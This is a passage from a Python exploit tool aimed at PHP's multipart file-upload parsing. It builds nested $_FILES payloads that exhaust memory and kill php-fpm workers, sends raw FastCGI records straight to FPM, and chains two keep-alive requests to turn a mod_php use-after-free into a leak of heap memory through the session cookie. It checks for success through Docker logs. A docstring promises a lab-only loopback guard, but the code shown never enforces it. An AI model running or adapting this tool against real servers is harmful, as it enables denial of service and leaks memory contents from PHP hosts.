    body = build_body(boundary, pad_mb=args.control_size_mb)

    hst, _, herr, _ = send_http_get(health_url, args.timeout)
    print(f"[*] control target={args.url} health={hst} err={herr!r} "
          f"size={args.control_size_mb}MiB (one normal field)")
    st, data, err, hdrs = send_http_raw(args.url, body, mp, args.timeout)
    hst2, _, _, _ = send_http_get(health_url, args.timeout)
    server = hdrs.get("server", "")
    oom = b"Allowed memory size" in data
    note = _probe_note(st, data, err)
    print(
        f"[control] normal-upload body={len(body)}B "
        f"({human_size(len(body))}) status={st} resp={len(data)}B "
        f"oom={oom} health={hst2} server={server!r} "
        f"note={note} err={err!r}",
        flush=True,
    )
    if data:
        n = args.body_bytes if args.body_bytes > 0 else 300
        print(f"        head={data[:min(n, 300)]!r}", flush=True)

    if st == 413:
        verdict = "SIZE LIMIT (413)"
    elif st is None or st >= 500:
        verdict = "SERVER/UNAVAILABLE or upstream failure"
    elif oom:
        verdict = "SAME-SIZE NORMAL UPLOAD ALSO OOM (size/limit-related)"
    elif st in (200, 201, 202, 204, 400, 401, 403, 404, 415):
        verdict = ("SAME-SIZE NORMAL UPLOAD OK (processed); "
                   "the OOM failure is shape-specific")
    else:
        verdict = f"unexpected status {st}"
    print(f"\n[*] verdict: {verdict}")
    args._control_verdict = verdict
    return 0


# --------------------------------------------------------------------------- #
# 500x amplifier: send + SAPI-aware verdict
# --------------------------------------------------------------------------- #
def _resolve_target(args):
    """Validate the target and return (mode, host, port, description).

    Returns mode=None when the target is not loopback (lab-only guard).
    """
    if args.url:
        host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
        return "http", host, urllib.parse.urlsplit(args.url).port or 80, args.url
    if ":" not in (args.fcgi or ""):
        print("[!] --fcgi must be host:port", file=sys.stderr)
        return None, "", 0, ""
    host, port_s = args.fcgi.rsplit(":", 1)
    host = host.strip("[]").lower()
    try:
        port = int(port_s)
    except ValueError:
        print("[!] --fcgi port must be an integer", file=sys.stderr)
        return None, "", 0, ""
    return "fcgi", host, port, args.fcgi


def _amp_report(plan: dict, info: dict | None = None) -> None:
    if not _VERBOSE:
        return
    info = info or {}
    if info.get("version"):
        major, minor = info["version"]
        chains = info.get("chains") or (6 if info["bytes_per_level"] >= 2448
                                        else 5)
        print(f"[*] target advertises PHP/{major}.{minor} -> "
              f"{info['bytes_per_level']}B/level ({chains} $_FILES chains)")
    elif info:
        print(f"[*] target version unknown (no X-Powered-By): assuming the "
              f"8.x cost, {info['bytes_per_level']}B/level")
    if info.get("auto_bumped"):
        print(f"[*] parts auto-raised {info['parts_before']} -> {plan['parts']} "
              f"to reach --amp-target-mb {info['target_mb']} on this PHP "
              f"generation")
    print(
        f"[*] amp plan: parts={plan['parts']} depth={plan['depth']} "
        f"keylen={plan['keylen']} levels/part={plan['levels']}"
        + (f" (shrunk from {plan['parts_requested']} to fit the wire budget)"
           if plan["shrunk"] else "")
    )
    print(
        f"    wire={plan['wire']}B ({human_size(plan['wire'])}) of a "
        f"{human_size(plan['budget'])} budget "
        "[nginx client_max_body_size defaults to 1m; Apache LimitRequestBody 0]"
    )
    print(
        f"    shape={plan['style']} per_part={plan['per_part']}B "
        f"(heap/part={plan['levels']}x{plan['bytes_per_level']}B)"
    )
    print(
        f"    est. heap={plan['parts']}x{plan['levels']}x"
        f"{plan['bytes_per_level']}B = {human_size(plan['est_heap'])} "
        f"=> amplification ~{plan['ratio']:.0f}x "
        f"(ceiling {plan['bytes_per_level']}/3={plan['bytes_per_level'] // 3}x "
        f"at unlimited depth; {AMP_MAX_DEPTH + 1} levels is the "
        f"max_input_nesting_level=64 limit)"
    )
    if plan["est_heap"] < 128 * 1024 * 1024:
        print(
            "[!] est. heap is below the 128M default memory_limit: this body "
            "will probably not OOM. Raise --amp-parts / --amp-depth / "
            "--amp-budget-kb.",
        )
    if plan["depth"] != plan["depth_requested"]:
        print(f"[!] depth clamped to {plan['depth']} (max {AMP_MAX_DEPTH}, "
              "max_input_nesting_level is 64)")
    if plan["keylen"] != plan["keylen_requested"]:
        print(f"[!] keylen clamped to {plan['keylen']} (allowed 1..4096)")
    if plan["style"] == "safe" and plan["parts"] > 1000:
        print("[!] parts > 1000 with distinct top-level names: some builds cap "
              "input at max_input_vars=1000 (verified NOT capped for "
              "$_FILES on 5.6/7.4/8.4); --amp-style max cannot hit the cap")


def _amp_resolve(args, *, session: bool, target_version=None):
    """Pick the shape (max/safe), apply overrides, return (plan, body, info).

    The part count is derived from --amp-target-mb and the *per-level cost of
    the target's PHP generation*, not hard-coded: a PHP 5.6/7.x endpoint has
    only six-minus-one $_FILES chains, so the same 880 parts cost 5/6 (or less)
    of the heap and would silently stay under memory_limit.
    """
    cfg = AMP_STYLES[args.amp_style]
    boundary = (args.boundary.encode() if args.boundary else cfg["boundary"])
    depth = cfg["depth"] if args.amp_depth is None else args.amp_depth
    keylen = cfg["keylen"] if args.amp_keylen is None else args.amp_keylen
    levels = min(max(0, depth), AMP_MAX_DEPTH) + 1

    chains, bpl = amp_level_cost(target_version)
    if args.amp_bytes_per_level:
        bpl = args.amp_bytes_per_level
        chains = 6 if bpl >= AMP_BYTES_PER_LEVEL else 5
    parts = cfg["parts"] if args.amp_parts is None else args.amp_parts
    auto_bumped = False
    if args.amp_parts is None and args.amp_target_mb > 0:
        need = math.ceil(args.amp_target_mb * 1024 * 1024 / (levels * bpl))
        if need > parts:
            parts, auto_bumped = need, True

    plan = amp_plan(parts, depth, keylen, args.amp_budget_kb,
                    session=session,
                    part_content_type=args.amp_content_type,
                    boundary=boundary, style=args.amp_style,
                    bytes_per_level=bpl)
    body = build_amp_body(plan["parts"], plan["depth"], plan["keylen"],
                          boundary, session=session,
                          part_content_type=args.amp_content_type,
                          style=args.amp_style)
    info = {
        "version": target_version,
        "chains": chains,
        "bytes_per_level": bpl,
        "auto_bumped": auto_bumped,
        "parts_before": cfg["parts"],
        "target_mb": args.amp_target_mb,
    }
    return boundary, plan, body, info


def _sapi_table() -> None:
    if not _VERBOSE:
        return
    print(
        "[*] SAPI semantics of this OOM:\n"
        "    nginx+php-fpm : child exits 70 at request startup, state reset "
        "-> DoS / worker churn\n"
        "    Apache+mod_php: child survives, RSHUTDOWN skipped -> dangling "
        "PS(id)/PS(http_session_vars) -> UAF (--payload amp-chain)"
    )


def _amp_attempts(args, plan: dict, body: bytes, boundary: bytes):
    """Yield (plan, body) attempts: the planned size, then bigger ones.

    The per-level cost is a property of the target's build (5/6 chains, and how
    much of it lands inside the Zend MM), so the version table is only a first
    guess.  If attempt 1 comes back "ok" -- e.g. a PHP 7.x box that allocates
    far less per level than the peak numbers suggest -- retry larger, still
    inside --amp-budget-kb.  Explicit --amp-parts disables the ladder.
    """
    yield plan, body
    if args.amp_parts is not None or args.amp_retries <= 0:
        return
    close = len(b"--" + boundary + b"--\r\n")
    fixed = len(_amp_session_prefix(boundary)) if args.amp_session else 0
    max_parts = max(plan["parts"],
                    (plan["budget"] - close - fixed) // plan["per_part"])
    current = plan["parts"]
    for factor in (1.6, 2.6, 4.0)[:max(0, min(args.amp_retries, 3))]:
        want = min(max_parts, int(math.ceil(current * factor)))
        if want <= current:
            break
        nxt = amp_plan(want, plan["depth"], plan["keylen"], args.amp_budget_kb,
                       session=args.amp_session,
                       part_content_type=args.amp_content_type,
                       boundary=boundary, style=plan["style"],
                       bytes_per_level=plan["bytes_per_level"])
        if nxt["parts"] <= current:
            break
        current = nxt["parts"]
        yield nxt, build_amp_body(nxt["parts"], nxt["depth"], nxt["keylen"],
                                  boundary, session=args.amp_session,
                                  part_content_type=args.amp_content_type,
                                  style=plan["style"])


def run_amp(args) -> int:
    """Send the amplifier and judge the OOM per SAPI (version-aware)."""
    mode, host, port, target_desc = _resolve_target(args)
    if mode is None:
        return 2
    if args.requests < 1:
        print("[!] requests must be >= 1", file=sys.stderr)
        return 2

    target_version = None
    if mode == "http":
        _server, powered = detect_http_identity(args.url)
        target_version = parse_php_version(powered)
    boundary, plan, body, info = _amp_resolve(
        args, session=args.amp_session, target_version=target_version)

    ver = info.get("version")
    print(f"[*] POST {target_desc}"
          + (f"  PHP/{ver[0]}.{ver[1]}" if ver else "")
          + f"  ({human_size(plan['wire'])} body)")
    print_legend()
    vprint(f"[*] mode={mode} payload=amp style={plan['style']}")
    _amp_report(plan, info)
    _sapi_table()
    if args.concurrency > 1:
        vprint("[*] amp sends its requests sequentially; -c is ignored")

    # Control: the SAME wire size as one normal field.  No OOM there + OOM on
    # the amplifier = the amplification is shape-specific, not a size limit.
    ctrl_kind = None
    if not args.no_control:
        ctrl_boundary = b"----ampctrl"
        ctrl = build_body(ctrl_boundary,
                          pad_mb=max(1, plan["wire"]) / (1024 * 1024))
        if mode == "http":
            cst, cdata, cerr = send_http(args.url, ctrl, ctrl_boundary,
                                         args.timeout)
        else:
            cst, cout, cerr_data, cerr = send_fcgi(
                host, port, args.script, ctrl, ctrl_boundary, args.timeout,
                args.content_length)
            cdata = cout + cerr_data
        ckind = resp_kind(cst, cdata, cerr)
        ctrl_kind = ckind
        fields = response_fields(cst, cdata, cerr)
        fields.append(f"req={clr(human_size(len(ctrl)), '2')}")
        print(clr("[control]", "2") + "  " + "  ".join(fields))
        if ckind == "EMPTY200":
            print("    note: the CONTROL also returned an empty 200 -- on this "
                  "target large bodies are swallowed, so an empty 200 from the\n"
                  "          payload is NOT evidence of the amplifier.")

    before = (docker_log_stats(args.docker_container)
              if args.docker_container else None)
    ooms = suspected_total = blocked = empty_total = 0
    kinds: dict = {}
    attempts = list(_amp_attempts(args, plan, body, boundary))
    found_at = 0
    seen_status: dict = {}
    found_label = ""
    idx = 0
    for attempt, (aplan, abody) in enumerate(attempts, 1):
        if len(attempts) > 1 and (attempt > 1 or _VERBOSE):
            if _VERBOSE:
                print(
                    f"[try {attempt}/{len(attempts)}] parts={aplan['parts']} "
                    f"wire={len(abody)}B est={human_size(aplan['est_heap'])}"
                )
            else:
                print(clr(f"[try {attempt}/{len(attempts)}] "
                          f"req={human_size(len(abody))}", "2"))
        for _ in range(args.requests):
            idx += 1
            if mode == "http":
                st, data, err = send_http(args.url, abody, boundary,
                                          args.timeout)
            else:
                app_status, stdout, stderr, err = send_fcgi(
                    host, port, args.script, abody, boundary, args.timeout,
                    args.content_length)
                st, data = app_status, stdout + stderr
            kind = resp_kind(st, data, err)
            kinds[kind] = kinds.get(kind, 0) + 1
            seen_status[status_label(st, mode)] = (
                seen_status.get(status_label(st, mode), 0) + 1)
            if not found_label:
                found_label = status_label(st, mode)
            oom = kind == "OOM"
            ooms += int(oom)
            empty200 = kind == "EMPTY200"
            empty_total += int(empty200)
            suspected = (not oom) and (empty200 or kind in
                                       ("UPSTREAM", "ERROR", "FATAL500"))
            suspected_total += int(suspected)
            blocked += int(kind == "TOO_LARGE")
            note = ("200 with an empty body: fatal text hidden by the target"
                    if empty200 else "")
            print(resp_line(idx, st, data, err, note=note, mode=mode))
            if _VERBOSE and data:
                n = args.body_bytes if args.body_bytes > 0 else 0
                if n:
                    print(f"        head={data[:n]!r}")
        if ooms or empty_total or blocked or kinds.get("ERROR"):
            found_at = attempt
            break

    d70 = d11 = 0
    if args.docker_container:
        d70, d11 = _print_log_delta(args.docker_container, before)

    print()
    if ooms:
        if _VERBOSE:
            print("[*] verdict: amplifier CONFIRMED -- "
                  f"attempt {found_at}/{len(attempts)} "
                  f"({human_size(attempts[found_at - 1][0]['wire'])} body) "
                  "exhausted memory_limit (unpatched build).")
        else:
            print(clr(f"[*] verdict: CONFIRMED -- {found_label} + "
                      '"Allowed memory size" in the body', "1;32"))
    elif d70 > 0 or d11 > 0:
        print("[*] verdict: amplifier CONFIRMED at the SAPI level -- the log "
              "shows the worker died; the OOM text was buffered by the front "
              "end.")
        print("    nginx: add 'fastcgi_buffering off;' if you also want the "
              "fatal text in the body.")
    elif empty_total and ctrl_kind == "EMPTY200":
        print(clr(f"[*] verdict: INCONCLUSIVE -- {found_label} with 0 bytes "
                  "for BOTH payload and control (status alone proves nothing)",
                  "1;33"))
        vprint("    The empty 200 is not evidence of the amplifier; confirm "
               "with --docker-container or a smaller-wire endpoint.")
    elif empty_total:
        print(clr(f"[*] verdict: LIKELY OOM -- {found_label} with 0 bytes, "
                  f"control {ctrl_kind or 'not sent'} (fatal text hidden)",
                  "1;33"))
        vprint("    A hidden fatal surfaces as an empty 200 when "
               "display_errors=Off or a front end buffers the body. Confirm "
               "with --docker-container (exit70/SIGSEGV), display_errors=On, "
               "or 'fastcgi_buffering off;'.")
    elif blocked:
        print(clr(f"[*] verdict: BLOCKED -- {found_label} (front-end limit < "
                  f"{human_size(plan['wire'])})", "1;31"))
    elif suspected_total:
        print(clr(f"[*] verdict: INCONCLUSIVE -- {found_label} with an "
                  "error/5xx and no usable body", "1;33"))
        vprint("    Shrink with --amp-budget-kb, or raise "
               "client_max_body_size / LimitRequestBody.")
    else:
        print(clr(f"[*] verdict: NO OOM -- {found_label} with a normal body",
                  "2"))
        if info.get("version"):
            vprint(f"    PHP {info['version'][0]}.{info['version'][1]} -> "
                   f"{info['bytes_per_level']}B/level, parts={plan['parts']} "
                   f"= {human_size(plan['est_heap'])}; raise --amp-target-mb "
                   "if the real memory_limit is higher, and note that "
                   "8.3.36/8.4.27/8.5.12+ cannot OOM at any size.")
        else:
            vprint("    No X-Powered-By: the 8.x per-level cost was assumed; "
                   "for PHP 5.x/7.x try --amp-bytes-per-level 1550/540 (or "
                   "rely on --amp-retries).")
    return 0


# --------------------------------------------------------------------------- #
# FastCGI sender (direct to FPM)
# --------------------------------------------------------------------------- #
def fcgi_record(rec_type: int, content: bytes, request_id: int = 1) -> bytes:
    padding = (-len(content)) % 8
    return (
        struct.pack("!BBHHBB", 1, rec_type, request_id, len(content), padding, 0)
        + content
        + b"\x00" * padding
    )


def nv_pair(name: str, value: str) -> bytes:
    nb, vb = name.encode(), value.encode()
    out = b""
    for n in (len(nb), len(vb)):
        out += bytes([n]) if n < 128 else struct.pack("!I", n | 0x80000000)
    return out + nb + vb


def send_fcgi(host: str, port: int, script: str, body: bytes,
              boundary: bytes, timeout: float, content_length=None):
    params = {
        "GATEWAY_INTERFACE": "CGI/1.1",
        "SERVER_SOFTWARE": "fpm-oom-generic",
        "SERVER_PROTOCOL": "HTTP/1.1",
        "REQUEST_METHOD": "POST",
        "SCRIPT_FILENAME": script,
        "SCRIPT_NAME": "/" + script.rsplit("/", 1)[-1],
        "REQUEST_URI": "/" + script.rsplit("/", 1)[-1],
        "DOCUMENT_ROOT": "/var/www/html",
        "CONTENT_TYPE": f"multipart/form-data; boundary={boundary.decode()}",
        "CONTENT_LENGTH": (str(content_length) if content_length is not None
                           else str(len(body))),
        "SERVER_NAME": "localhost",
        "SERVER_PORT": str(port),
        "REMOTE_ADDR": "127.0.0.1",
    }
    blob = b"".join(nv_pair(k, v) for k, v in params.items())

    sock = None
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
    except OSError as exc:
        return None, b"", b"", f"connect failed: {exc}"
    stdout, stderr = bytearray(), bytearray()
    app_status = None
    error = ""
    send_error = [""]

    def sender() -> None:
        try:
            sock.sendall(fcgi_record(FCGI_BEGIN_REQUEST,
                                     struct.pack("!HB5x", FCGI_RESPONDER, 0)))
            sock.sendall(fcgi_record(FCGI_PARAMS, blob))
            sock.sendall(fcgi_record(FCGI_PARAMS, b""))
            for off in range(0, len(body), 65535):
                sock.sendall(fcgi_record(FCGI_STDIN, body[off:off + 65535]))
            sock.sendall(fcgi_record(FCGI_STDIN, b""))
        except OSError as exc:
            send_error[0] = str(exc)

    def recv_exact(n: int) -> bytes:
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                raise ConnectionError("connection closed")
            data += chunk
        return data

    thread = threading.Thread(target=sender, daemon=True)
    thread.start()
    try:
        while True:
            header = recv_exact(8)
            _, rec_type, _, content_len, padding_len, _ = struct.unpack(
                "!BBHHBB", header
            )
            content = recv_exact(content_len)
            if padding_len:
                recv_exact(padding_len)

            if rec_type == FCGI_STDOUT:
                stdout += content
            elif rec_type == FCGI_STDERR:
                stderr += content
            elif rec_type == FCGI_END_REQUEST:
                app_status = struct.unpack("!I", content[:4])[0]
                break
    except (ConnectionError, OSError) as exc:
        error = str(exc)
    finally:
        thread.join(timeout=2.0)
        try:
            sock.close()
        except OSError:
            pass

    if not error and send_error[0]:
        error = send_error[0]
    return app_status, bytes(stdout), bytes(stderr), error


# --------------------------------------------------------------------------- #
# mod_php crash chain (two chunked requests, same keep-alive connection)
# --------------------------------------------------------------------------- #
def build_modphp_body(pad_mb: float, name_mb: float, boundary: bytes) -> bytes:
    """Same shape as php8511_chunked_repro.py."""
    def part(headers: bytes, body: bytes) -> bytes:
        return b"--" + boundary + b"\r\n" + headers + b"\r\n\r\n" + body + b"\r\n"

    out = bytearray()
    out += part(b'Content-Disposition: form-data; name="pad"', b"")
    out += b"A" * int(pad_mb * 1024 * 1024) + b"\r\n"
    name = b"A" * int(name_mb * 1024 * 1024) + b"[k]"
    out += part(
        b'Content-Disposition: form-data; name="' + name
        + b'"; filename=""\r\nContent-Type: text/plain',
        b"x",
    )
    out += b"--" + boundary + b"--\r\n"
    return bytes(out)


def chunked_encode(data: bytes, chunk: int = 1 << 20) -> bytes:
    out = bytearray()
    for off in range(0, len(data), chunk):
        piece = data[off:off + chunk]
        out += f"{len(piece):x}".encode() + b"\r\n" + piece + b"\r\n"
    out += b"0\r\n\r\n"
    return bytes(out)


def read_http_response(sock: socket.socket):
    """Read one HTTP response. Returns (status, body); status None on EOF."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            return None, buf
        buf += chunk

    header, _, rest = buf.partition(b"\r\n\r\n")
    lines = header.split(b"\r\n")
    status = None
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split(b" ")[1])
        except (IndexError, ValueError):
            pass

    content_length = None
    is_chunked = False
    for line in lines[1:]:
        lower = line.lower()
        if lower.startswith(b"content-length:"):
            try:
                content_length = int(line.split(b":", 1)[1].strip())
            except ValueError:
                pass
        elif lower.startswith(b"transfer-encoding:") and b"chunked" in lower:
            is_chunked = True

    if is_chunked:
        data = rest
        while b"\r\n0\r\n\r\n" not in data and not data.endswith(b"0\r\n\r\n"):
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
        return status, data

    if content_length is not None:
        while len(rest) < content_length:
            chunk = sock.recv(65536)
            if not chunk:
                break
            rest += chunk
        return status, rest[:content_length]

    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        rest += chunk
    return status, rest


def _pair_headers(host: str, port: int, path: str, boundary: bytes,
                  close: bool, length: int) -> bytes:
    """Keep-alive request headers for the amp-chain pair (Content-Length)."""
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        f"Content-Length: {length}\r\n"
        f"Connection: {'close' if close else 'keep-alive'}\r\n\r\n"
    ).encode()


def read_response_full(sock: socket.socket):
    """Read one HTTP response; return (status, headers, raw_body).

    The body is returned as read off the wire (chunked framing is not
    decoded): callers only need the Set-Cookie headers for a leak check and a
    substring search for the OOM marker, both of which survive framing.
    """
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(65536)
        if not chunk:
            return None, {}, buf
        buf += chunk

    head, _, rest = buf.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n")
    status = None
    if lines and lines[0].startswith(b"HTTP/"):
        try:
            status = int(lines[0].split(b" ")[1])
        except (IndexError, ValueError):
            pass

    headers: dict[str, str] = {}
    for line in lines[1:]:
        if b":" not in line:
            continue
        key, _, value = line.partition(b":")
        key = key.strip().lower().decode("latin-1")
        value = value.strip().decode("latin-1")
        headers[key] = f"{headers[key]}, {value}" if key in headers else value

    if "chunked" in headers.get("transfer-encoding", "").lower():
        data = rest
        while not (data.endswith(b"0\r\n\r\n") or b"\r\n0\r\n\r\n" in data):
            chunk = sock.recv(65536)
            if not chunk:
                break
            data += chunk
        return status, headers, data

    content_length = headers.get("content-length")
    if content_length is not None:
        try:
            need = int(content_length)
        except ValueError:
            need = None
        if need is not None:
            while len(rest) < need:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                rest += chunk
            return status, headers, rest[:need]

    while True:
        chunk = sock.recv(65536)
        if not chunk:
            break
        rest += chunk
    return status, headers, rest


def send_pair_keepalive(url: str, body1: bytes, body2: bytes, boundary: bytes,
                        timeout: float, delay: float) -> dict:
    """A then B on ONE TCP connection (prefork pins a connection to a child).

    Returns {req1: (status, headers, body), req2: (...), same_conn, note, err}.
    If the server closed the connection after A (OOM bailout can make it drop
    keep-alive), B is retried on a fresh connection and same_conn=False -- that
    usually lands in a different worker, so a miss there means nothing.
    """
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    result = {"req1": (None, {}, b""), "req2": (None, {}, b""),
              "same_conn": False, "note": "", "err": ""}

    def open_sock():
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        return sock

    def send_one(sock, body, close):
        sock.sendall(_pair_headers(host, port, path, boundary, close,
                                   len(body)))
        sock.sendall(body)
        return read_response_full(sock)

    try:
        sock = open_sock()
    except OSError as exc:
        result["err"] = str(exc)
        result["note"] = "connect-error"
        return result

    try:
        result["req1"] = send_one(sock, body1, False)
        result["note"] = "req1-ok"
        if delay:
            time.sleep(delay)
        try:
            result["req2"] = send_one(sock, body2, True)
            result["same_conn"] = result["req2"][0] is not None
            result["note"] = "same-connection"
            return result
        except OSError as exc:
            result["note"] = f"req2-error: {exc}"
    except OSError as exc:
        result["err"] = str(exc)
        result["note"] = "req1-error"
    finally:
        try:
            sock.close()
        except OSError:
            pass

    # Fallback: fresh connection for B (different worker -> weaker evidence).
    try:
        sock2 = open_sock()
    except OSError as exc:
        result["err"] = str(exc)
        return result
    try:
        result["req2"] = send_one(sock2, body2, True)
        result["same_conn"] = False
        result["note"] += f" | fallback fresh connection"
    except OSError as exc:
        result["err"] = str(exc)
        result["note"] += f" | fresh-connection-error: {exc}"
    finally:
        try:
            sock2.close()
        except OSError:
            pass
    return result


def _crash_headers(host: str, port: int, path: str, boundary: bytes,
                   close: bool) -> bytes:
    return (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary.decode()}\r\n"
        "Transfer-Encoding: chunked\r\n"
        f"Connection: {'close' if close else 'keep-alive'}\r\n\r\n"
    ).encode()


def send_crash_pair(url: str, body1: bytes, body2: bytes, boundary: bytes,
                    keepalive: bool, timeout: float, delay: float):
    """Send the two-request mod_php chain.

    Returns (same_connection, st1, resp1, st2, resp2, err, note).
    """
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    if u.query:
        path += "?" + u.query

    def send_one(sock: socket.socket, body: bytes, close: bool):
        sock.sendall(_crash_headers(host, port, path, boundary, close))
        sock.sendall(chunked_encode(body))
        return read_http_response(sock)

    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        st1, resp1 = send_one(sock, body1, False)
    except OSError as exc:
        sock.close()
        return False, None, b"", None, b"", str(exc), "req1-error"

    if delay:
        time.sleep(delay)

    if keepalive:
        try:
            st2, resp2 = send_one(sock, body2, True)
            sock.close()
            return True, st1, resp1, st2, resp2, "", "same-connection"
        except OSError as exc:
            sock.close()
            # fall back to a fresh connection for the second request
            sock = socket.create_connection((host, port), timeout=timeout)
            sock.settimeout(timeout)
            try:
                st2, resp2 = send_one(sock, body2, True)
                return False, st1, resp1, st2, resp2, "", f"fallback: {exc}"
            except OSError as exc2:
                return False, st1, resp1, None, b"", str(exc2), "req2-error"
            finally:
                sock.close()

    sock.close()
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.settimeout(timeout)
    try:
        st2, resp2 = send_one(sock, body2, True)
        return False, st1, resp1, st2, resp2, "", "separate-connection"
    except OSError as exc:
        return False, st1, resp1, None, b"", str(exc), "req2-error"
    finally:
        sock.close()


def docker_sigsegv_count(container: str):
    try:
        result = subprocess.run(
            ["docker", "logs", container],
            capture_output=True, text=True, timeout=20,
        )
        return (result.stdout + result.stderr).count("Segmentation fault")
    except Exception:
        return None


def docker_log_stats(container: str):
    """Count the two SAPI tell-tales in a container log.

    exit70 : php-fpm "child N exited with code 70" -> OOM at request startup,
             the child is replaced (state cleared, DoS only).
    sigsegv: httpd/mod_php "exit signal Segmentation fault (11)" -> the UAF
             was dereferenced (memory corruption, not churn).
    """
    try:
        result = subprocess.run(
            ["docker", "logs", container],
            capture_output=True, text=True, timeout=20,
        )
    except Exception:
        return None
    blob = (result.stdout or "") + (result.stderr or "")
    return {
        "exit70": blob.count("code 70"),
        "sigsegv": blob.count("Segmentation fault") + blob.count("signal 11"),
    }


def _print_log_delta(container: str, before) -> tuple:
    """Print the SAPI-specific log delta after an amp run.

    Returns (exit70_delta, sigsegv_delta); (-1, -1) when unavailable.
    """
    after = docker_log_stats(container)
    if before is None or after is None:
        print(f"[*] docker log stats unavailable for {container!r}")
        return -1, -1
    d70 = after["exit70"] - before["exit70"]
    d11 = after["sigsegv"] - before["sigsegv"]
    print(
        f"[*] {container} log delta: exit70={d70} sigsegv={d11} "
        f"(totals {after['exit70']}/{after['sigsegv']})"
    )
    if d70:
        print("    -> FPM child died at request startup: OOM confirmed at the "
              "SAPI level (worker churn, no cross-request state).")
    if d11:
        print("    -> SIGSEGV: mod_php dereferenced the dangling state "
              "(UAF, not churn).")
    return d70, d11


def docker_restart(container: str) -> bool:
    try:
        subprocess.run(
            ["docker", "restart", container],
            check=True, stdout=subprocess.DEVNULL, timeout=120,
        )
        return True
    except Exception as exc:
        print(f"[!] docker restart failed: {exc}", file=sys.stderr)
        return False


def wait_http_ready(url: str, timeout: float = 30.0) -> bool:
    u = urllib.parse.urlsplit(url)
    host = u.hostname or "127.0.0.1"
    port = u.port or 80
    path = u.path or "/"
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            conn = http.client.HTTPConnection(host, port, timeout=3)
            conn.request("GET", path)
            conn.getresponse().read()
            conn.close()
            return True
        except (OSError, http.client.HTTPException):
            time.sleep(0.3)
    return False


def run_modphp_crash(args) -> int:
    if not args.url:
        print("[!] --payload modphp-crash requires --url (mod_php endpoint)",
              file=sys.stderr)
        return 2
    host = (urllib.parse.urlsplit(args.url).hostname or "").lower()
    if args.requests < 1:
        print("[!] --requests must be >= 1", file=sys.stderr)
        return 2

    if args.restart_container:
        print(f"[!] restarting lab container {args.restart_container!r} ...")
        if not docker_restart(args.restart_container):
            return 2
        if not wait_http_ready(args.url, timeout=60):
            print("[!] target not ready after restart", file=sys.stderr)
            return 2

    boundary = (args.boundary.encode() if args.boundary
                else b"----modphpcrash")
    body1 = build_modphp_body(args.pad1_mb, args.name_mb, boundary)
    body2 = build_modphp_body(args.pad2_mb, args.name_mb, boundary)

    before = (docker_sigsegv_count(args.docker_container)
              if args.docker_container else None)

    print(
        f"[*] mode=modphp-crash target={args.url}\n"
        f"[*] body1={len(body1)}B ({human_size(len(body1))}) "
        f"(pad={args.pad1_mb}MB) "
        f"body2={len(body2)}B ({human_size(len(body2))}) "
        f"(pad={args.pad2_mb}MB) name={args.name_mb}MB\n"
        f"[*] pairs={args.requests} keepalive={not args.no_keepalive} "
        f"delay={args.delay}s"
    )

    for pair in range(1, args.requests + 1):
        same, st1, r1, st2, r2, err, note = send_crash_pair(
            args.url, body1, body2, boundary,
            keepalive=not args.no_keepalive,
            timeout=args.timeout, delay=args.delay,
        )
        print(
            f"[{pair:04d}] req1 status={st1} {oom_text(OOM_MARKER in r1)} "
            f"resp={len(r1)}B | req2 status={st2} "
            f"{oom_text(OOM_MARKER in r2)} "
            f"resp={len(r2)}B | same_conn={same} note={note} err={err!r}",
            flush=True,
        )
        if args.body_bytes > 0:
            if r1:
                print(f"        req1={r1[:args.body_bytes]!r}", flush=True)
            if r2:
                print(f"        req2={r2[:args.body_bytes]!r}", flush=True)

    # Apache writes the SIGSEGV line slightly after the connection drops.
    # Poll the container log for a few seconds instead of counting immediately.
    after = before
    if args.docker_container and before is not None:
        deadline = time.monotonic() + 5.0
        while time.monotonic() < deadline:
            time.sleep(0.25)
            after = docker_sigsegv_count(args.docker_container)
            if after is None or after > before:
                break
    elif args.docker_container:
        after = docker_sigsegv_count(args.docker_container)
    else:
        time.sleep(0.5)

    if before is not None and after is not None:
        new = after - before
        print(f"\n[*] {clr('SIGSEGV', '1;31')} ({args.docker_container}): "
              f"before={before} after={after} "
              f"new={clr(new, '1;32' if new > 0 else '1;31')}")
        if new == 0:
            print(
                "[*] no new SIGSEGV. The workers may be dirty from earlier OOMs.\n"
                "    Restart the container and retry, or pass --restart-container."
            )
    return 0


def run_amp_chain(args) -> int:
    """mod_php A/B with the small (sub-1MiB) amplifier.

    A (~230KiB): amplifier + session fields -> OOM during request startup; the
       bailout/longjmp skips RSHUTDOWN, so PS(id) / PS(http_session_vars)
       still point at memory that was handed back to the Zend heap.
    B (~6.7KiB): consumer that reclaims the stale state and asks PHP to
       serialise 256 bytes of neighbouring heap into PHPSESSID.

    A and B share one keep-alive connection because prefork pins a connection
    to a single child; that is the only way B runs in the poisoned worker.
    nginx+FPM is refused by default: the FPM child exits at request startup,
    so nothing survives for B to reclaim.
    """
    mode, host, port, target_desc = _resolve_target(args)
    if mode is None:
        return 2
    if mode != "http":
        print("[!] amp-chain needs --url: FastCGI has no single-connection "
              "worker pinning, so the A/B premise does not hold",
              file=sys.stderr)
        return 2
    if args.requests < 1:
